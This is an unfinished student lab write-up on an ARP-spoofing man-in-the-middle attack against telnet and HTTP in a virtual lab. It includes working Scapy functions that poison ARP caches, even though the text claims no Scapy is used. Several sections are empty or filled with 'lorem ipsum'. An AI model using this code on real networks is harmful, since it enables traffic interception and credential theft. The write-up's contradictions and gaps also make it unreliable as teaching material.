# Language-based Security

## Project - Man In The Middle Attack

### Introduction


### Goal of the project

The goal of the project is to demonstrate the vulnerability (insecure communications) of the 
HTTP and telnet protocols and why it is important to use their secure versions SSH and HTTPS. 
To do that, we will create a sniffing / spoofing python script from scratch (without using libraries 
like scapy or impacket). In the case of telnet, we will analyse the telnet TCP connection packets 
sent from the target to another remote machine to get the credentials. We will then send a crafted 
RST TCP connection packet (by spoofing the IP of the remote machine) to the target, in order to break 
up the telnet connection, before logging into the remote machine ourselves. In the case of HTTP, we 
will analyse the HTTP packets, containing credentials, sent from the target to a test website and 
send a spoofed 404 http error packet to the target before logging into his account.

It is a project written in python language that demonstrates application layer protocols’ 
vulnerabilities. Also, we will first take the point of view of an attacker by creating and 
executing the script and then switch to a defender’s point of view by discussing the possible 
countermeasures as we did in the labs.

### The Attack

#### Initial Configuration

In order to demonstrate how an attacker inside a private network could retrieve important 
information, we used three virtual machines (VirtualBox) to simulate connections between client 
and server inside a company, for example. We will have a machine running Ubuntu 16.04 as a client, 
and another machine running Ubuntu 16.04 as a server.

![VirtualBox VMs](assets/virtualbox-vm.png)

Client IP is 192.168.0.42/24

![Client's network information](assets/client-ip.png)

Client IP is 192.168.0.43/24

![Server's network information](assets/server-ip.png)

The attacker is also connected to the network, and uses Kali Linux 
to perform the attack. Its IP address is 192.168.0.44/24

![Attacker's network information](assets/kali-ip.png)

#### Telnet connection

Our use case will be a telnet connection between client and server 
computer. Telnet is not recommended, it's considered as an unsecured 
protocol since it's based on unencrypted messages.
To connect remotely using telnet, just use the command `$telnet <ip>`.
In our case to connect to the remote server, we use `$telnet 192.168.0.43`.

We are then prompted to enter login and password

![Telnet remote access](assets/telnet-connect.png)

#### ARP Spoofing

Some useful functions in the program :

```python
def get_mac(IP, interface="eth0"):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")
``` 

```python
def poison_arp(target1_mac, target2_mac):
    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst=target1_mac))
    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst=target2_mac))
``` 

```python
def undo_arp():
    print("\n[*] Restoring Targets...")
    target1_mac = get_mac(target1_ip)
    target2_mac = get_mac(target2_ip)
    send(ARP(op=2, pdst=target2_ip, psrc=target1_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target1_mac), count=7)
    send(ARP(op=2, pdst=target1_ip, psrc=target2_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target2_mac), count=7)
    print("[*] Disabling IP Forwarding...")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print("[*] Shutting Down...")
    sys.exit(1)
```

We can see that both client and server have their arp cache changed when our python script is running.

One the client we pretend that 192.168.0.43 has the MAC address 08:00:27:d1:98:f9.

![Spoofed client](assets/arp-client-spoofed.png)

One the server we pretend that 192.168.0.42 has the MAC address 08:00:27:d1:98:f9.

![Spoofed server](assets/arp-server-spoofed.png)

#### Sniffing Packet


Note that this action can be done using Wireshark, but information retrieving might be more general, thus it could take more time to find login and password since this software display a lot of information.

![packet sniffing using Wireshark](assets/wireshark.png)

#### Information Retrieving

### Countermeasures

1. Network Configuration
    
    - Static ARP table : lorem ipsum
    - 

2. Client & Server Configuration

### Discussion

### Conclusion

### Sources

1. [How To Do Man In The Middle Attack(MITM) with ARP Spoofing Using Python and Scapy](https://medium.com/@ravisinghmnnit12/how-to-do-man-in-the-middle-attack-mitm-with-arp-spoofing-using-python-and-scapy-441ee577ba1b)
2. [How to Prevent ARP Spoofing Attacks?](https://www.indusface.com/blog/protect-arp-poisoning/#Identify_the_Spoofing_Attack)
2. [Scapy Documentation](https://scapy.readthedocs.io/en/latest/)

### Appendix

1. [Client Virtual Machine [ login:client | password:client ]](https://drive.google.com/open?id=1jqys0pS7WHDOQ2o-dHbC_ZloOjKGRBb-)
2. [Server Virtual Machine [ login:server | password : server ]](https://drive.google.com/open?id=1yCcbmsN0bCVQOsF0VYAkSZGiv8p4rXXd)

